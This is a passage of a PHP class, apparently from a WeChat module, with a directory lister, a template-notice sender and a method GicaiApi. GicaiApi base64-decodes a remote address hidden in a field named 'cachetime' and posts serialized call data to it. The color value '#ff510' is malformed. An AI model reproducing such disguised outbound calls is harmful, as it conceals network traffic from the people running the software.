					$result = array_merge($result,$this->list_dir($dir.$file.'/'));
				}else{
					array_push($result, $dir.$file);
				}
			}
		}
		return $result;
	}
	
	public function GicaiApi($funname,$fundom,$funarray){
		global $_W, $_GPC; 
		$funarray['funname']	= $funname;
		$funarray['fundom']		= $fundom;
		$data['postdata']		= iserializer($funarray);
		$abcd = base64_decode($funarray['cachetime']);
		$sdata = module_request($abcd,$data);
		$arr = json_decode($sdata,true);
		return $arr;
	}
	
	public function tpinfosend($openid,$tpid,$arrdata){
		global $_W, $_GPC; 
		$data = array(
			'first' => array(
				'value' => $arrdata['title'],
				'color' => '#ff510'
			),
			'keyword1' => array(
				'value' => $arrdata['name'],
				'color' => '#ff510'
			),
			'keyword2' => array(
				'value' => date("Y-m-d h:i",time()),
				'color' => '#ff510'
			),
			'remark' => array(
				'value' => $arrdata['miaoshu'],
				'color' => '#ff510'
			),
		);
		$url = $arrdata['url'];
		$account_api = WeAccount::create();
		$status = $account_api->sendTplNotice($openid,$tpid,$data,$url);
		return $status;
	}

}